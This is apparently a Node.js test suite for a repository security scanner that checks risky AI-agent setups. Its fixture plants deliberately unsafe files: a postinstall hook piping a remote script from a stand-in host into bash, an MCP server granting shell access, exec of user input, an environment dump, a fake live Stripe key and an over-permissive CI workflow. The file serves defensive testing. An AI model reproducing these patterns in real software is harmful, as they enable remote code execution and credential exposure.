import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { scanRepository, toSarif, verifyBundle } from '../inspector/agent-risk-inspector.mjs';

function fixture() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'arl-inspector-'));
  fs.mkdirSync(path.join(root, '.github', 'workflows'), { recursive: true });
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    name: 'unsafe-agent',
    dependencies: { openai: 'latest', express: '^5.0.0' },
    scripts: { postinstall: 'curl https://example.invalid/setup.sh | bash' },
  }, null, 2));
  fs.writeFileSync(path.join(root, '.env'), 'STRIPE_SECRET_KEY=sk_live_1234567890abcdefghijklmnop\n');
  fs.writeFileSync(path.join(root, 'Dockerfile'), 'FROM node:latest\nCOPY . .\nCMD ["node","app.js"]\n');
  fs.writeFileSync(path.join(root, '.mcp.json'), JSON.stringify({ mcpServers: { shell: { command: 'bash', args: ['/'] } } }));
  fs.writeFileSync(path.join(root, 'app.js'), `import OpenAI from 'openai';\nimport { exec } from 'node:child_process';\nconsole.log(process.env);\nexec(userInput);\n`);
  fs.writeFileSync(path.join(root, '.github', 'workflows', 'ci.yml'), 'on: pull_request_target\npermissions: write-all\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n');
  return root;
}

test('local inspector produces signed, redacted evidence with high-risk findings', async (t) => {
  const root = fixture();
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const bundle = await scanRepository(root, { authorised: true, includePaths: false });
  const serialized = JSON.stringify(bundle);
  assert.equal(bundle.schema, 'arl.inspection.bundle.v1');
  assert.equal(verifyBundle(bundle).valid, true);
  assert.ok(bundle.findings.some((item) => item.ruleId === 'ARL-SEC-001'));
  assert.ok(bundle.findings.some((item) => item.ruleId === 'ARL-MCP-001'));
  assert.ok(bundle.findings.some((item) => item.ruleId === 'ARL-CICD-001'));
  assert.ok(bundle.findings.some((item) => item.ruleId === 'ARL-AI-001'));
  assert.ok(bundle.summary.counts.critical >= 2);
  assert.equal(serialized.includes('sk_live_1234567890abcdefghijklmnop'), false);
  assert.equal(serialized.includes('exec(userInput)'), false);
  assert.ok(bundle.findings.flatMap((item) => item.evidence).every((item) => !('content' in item)));
  const sarif = toSarif(bundle);
  assert.equal(sarif.version, '2.1.0');
  assert.ok(sarif.runs[0].results.length >= bundle.findings.length);
  assert.equal(JSON.stringify(sarif).includes('sk_live_1234567890abcdefghijklmnop'), false);
});

test('bundle tampering invalidates the Ed25519 integrity proof', async (t) => {
  const root = fixture();
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const bundle = await scanRepository(root, { authorised: true });
  bundle.summary.postureScore += 1;
  assert.equal(verifyBundle(bundle).valid, false);
});

test('inspection requires explicit operator authorisation in CLI mode', async () => {
  const root = fixture();
  try {
    const bundle = await scanRepository(root, { authorised: false });
    assert.equal(bundle.attestations.authorisedByOperator, false);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('accepted-risk review remains visible and does not reduce technical risk', async (t) => {
  const root = fixture();
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const baseline = await scanRepository(root, { authorised: true });
  fs.writeFileSync(path.join(root, '.agentrisk.json'), JSON.stringify({
    acceptedRisks: [{
      ruleId: 'ARL-MCP-001',
      basename: '.mcp.json',
      reason: 'Temporary exception approved while the isolated runner is replaced.',
      owner: 'Security owner',
      expires: '2099-12-31',
    }],
    exclude: ['generated/**'],
  }, null, 2));
  const reviewed = await scanRepository(root, { authorised: true });
  const finding = reviewed.findings.find((item) => item.ruleId === 'ARL-MCP-001');
  assert.equal(finding.review.status, 'accepted-risk');
  assert.equal(reviewed.summary.technicalRisk, baseline.summary.technicalRisk);
  assert.equal(reviewed.summary.acceptedRiskTotal, 1);
  assert.deepEqual(reviewed.scope.userExclusions, ['generated/**']);
});

test('secret fingerprints are scan-local and cannot correlate a credential across scans', async (t) => {
  const root = fixture();
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const first = await scanRepository(root, { authorised: true });
  const second = await scanRepository(root, { authorised: true });
  const firstFact = first.findings.find((item) => item.ruleId === 'ARL-SEC-001').evidence[0].fact;
  const secondFact = second.findings.find((item) => item.ruleId === 'ARL-SEC-001').evidence[0].fact;
  assert.notEqual(firstFact, secondFact);
});


test('named false positives remain visible but do not inflate technical risk', async (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'arl-fp-'));
  t.after(() => fs.rmSync(root, { recursive:true, force:true }));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name:'secret-fixture', dependencies:{ openai:'1.0.0' } }));
  fs.writeFileSync(path.join(root, 'fixture.env'), 'STRIPE_SECRET_KEY=sk_live_1234567890abcdefghijklmnop\n');
  const baseline = await scanRepository(root, { authorised:true });
  const secret = baseline.findings.find((item) => item.ruleId === 'ARL-SEC-001');
  assert.ok(secret);
  fs.writeFileSync(path.join(root, '.agentrisk.json'), JSON.stringify({
    falsePositives: [{
      ruleId: 'ARL-SEC-001',
      basename: 'fixture.env',
      reason: 'Synthetic credential fixture used only for scanner regression testing.',
      owner: 'Security test owner',
      expires: '2099-12-31',
    }],
  }, null, 2));
  const reviewed = await scanRepository(root, { authorised:true });
  const finding = reviewed.findings.find((item) => item.ruleId === 'ARL-SEC-001');
  assert.equal(finding.review.status, 'false-positive');
  assert.equal(reviewed.summary.falsePositiveTotal, 1);
  assert.ok(reviewed.summary.technicalRisk < baseline.summary.technicalRisk);
  assert.equal(reviewed.summary.activeFindingsTotal, reviewed.summary.findingsTotal - 1);
});

test('public image badge CORS is not reported as an application wildcard CORS weakness', async (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'arl-cors-'));
  t.after(() => fs.rmSync(root, { recursive:true, force:true }));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name:'public-badge', dependencies:{ openai:'1.0.0' } }));
  fs.writeFileSync(path.join(root, 'server.js'), `res.writeHead(200, {'Content-Type':'image/svg+xml','Access-Control-Allow-Origin':'*','Cross-Origin-Resource-Policy':'cross-origin','Cache-Control':'public, max-age=600'});`);
  const bundle = await scanRepository(root, { authorised:true });
  assert.equal(bundle.findings.some((item) => item.ruleId === 'ARL-WEB-001'), false);
});
